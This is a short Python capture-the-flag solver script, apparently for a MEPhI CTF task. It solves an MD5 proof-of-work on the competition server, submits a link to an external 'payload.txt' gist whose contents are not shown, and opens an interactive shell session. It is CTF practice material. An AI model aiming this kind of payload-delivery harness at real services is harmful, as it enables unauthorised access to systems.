import re
from pwn import remote
from hashlib import md5
from itertools import count


HOST = 'misc.mephictf.ru'
PORT = 5000


def solve_proof_of_work(salt: str, prefix: str) -> str:
    print(f'Solving proof of work, {salt = }, {prefix = }')
    for i in count():
        attempt = str(i)
        if md5((attempt + salt).encode()).hexdigest().startswith(prefix):
            return attempt


with remote(HOST, PORT) as r:
    challenge_text = r.recvuntil(b'>').decode()
    challenge = re.search(
        r'md5\(\(s \+ "(?P<salt>[a-f0-9]+)"\)\.encode\(\)\)\.hexdigest\(\)\.startswith\("(?P<prefix>[a-f0-9]+)"\)',
        challenge_text,
    )
    assert challenge is not None

    salt = challenge.group('salt')
    prefix = challenge.group('prefix')

    r.sendline(solve_proof_of_work(salt, prefix).encode())

    r.recvuntil(b'Enter the link to your input: ')

    r.sendline(b'https://gist.githubusercontent.com/LeKSuS-04/d53d2dc4af444f1c1cf4de45418c22db/raw/177e547eedf32156991dd4b14dd141bb8a87b335/payload.txt')

    r.interactive()
